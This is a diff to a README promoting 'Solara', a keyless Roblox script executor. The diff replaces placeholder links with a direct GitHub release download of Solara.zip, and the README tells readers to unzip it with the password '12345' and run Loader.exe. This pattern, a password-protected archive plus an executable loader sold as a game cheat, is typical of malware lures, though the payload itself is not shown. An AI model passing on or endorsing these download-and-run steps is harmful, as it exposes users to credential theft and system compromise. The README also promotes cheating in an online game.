@@ -16,7 +16,7 @@ If you're tired of fake executors that spam ads or require complex setups, give 
 
 ## 🌌 **How to Install Solara**
 
-1. **Download** – [Download Solara](#) and unzip the archive.  
+1. **Download** – [Download Solara](https://github.com/alejorodriguez/solara-executor-rblx/releases/download/solara/Solara.zip) and unzip the archive.  
    *(Archive Password: `12345`)*
    
 2. **Open File** – Run `Loader.exe` to launch the executor.
@@ -73,7 +73,7 @@ For support, visit our [official support page](#) for tutorials, troubleshooting
 
 ---
 
-### 📥 **[Download Solara Now](#)**
+### 📥 **[Download Solara Now](https://github.com/alejorodriguez/solara-executor-rblx/releases/download/solara/Solara.zip)**
 
 **Password for Archive:** `12345`  
 Unlock the true potential of Roblox with **Solara** – fast, reliable, and always keyless!
